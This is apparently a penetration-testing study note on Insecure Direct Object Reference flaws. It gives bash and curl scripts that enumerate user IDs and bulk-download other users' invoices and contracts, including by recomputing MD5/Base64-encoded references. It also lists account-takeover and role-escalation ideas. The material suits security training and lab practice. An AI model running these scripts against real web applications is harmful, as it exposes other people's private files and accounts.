
`Insecure Direct Object Reference` occur when a web application exposes a direct reference to an object. 

- Check if there is ID we can manipulate in requests
- It can also be files like file_1.pdf, file_2.pdf
- It can also be encoded (MD5 or Base64)

---

## Mass Enumeration

Suppose files to downloads are found in the source code of `http://server/id/<id>`
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>

<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

We can curl and grep to retrieve the endpoint to the download:
```shell
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

And a little bash script to downloads all the files found.
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

Similarly, if the request is `POST`, we can use similar script.
```sh
for i in {1..20}; do curl -s -X POST "http://154.57.164.72:31206/documents.php" --data "uid=$i" | grep "/document" ; done
```

---

## Bypassing Encoded References
#### Function Disclosure

Many web developers may make the mistake of performing sensitive functions on the front-end.
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Mass Enumeration:
```shell
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

Downloads:
```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n "$i" | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

---

## Exploiting Insecure APIs

There are a few things we could try in this case i.e. `IDOR Insecure Function Calls`:

1. Change our `uid` to another user's `uid`, such that we can take over their accounts
2. Change another user's details, which may allow us to perform several web attacks
3. Create new users with arbitrary details, or delete existing users
4. Change our role to a more privileged role to be able to perform more actions

---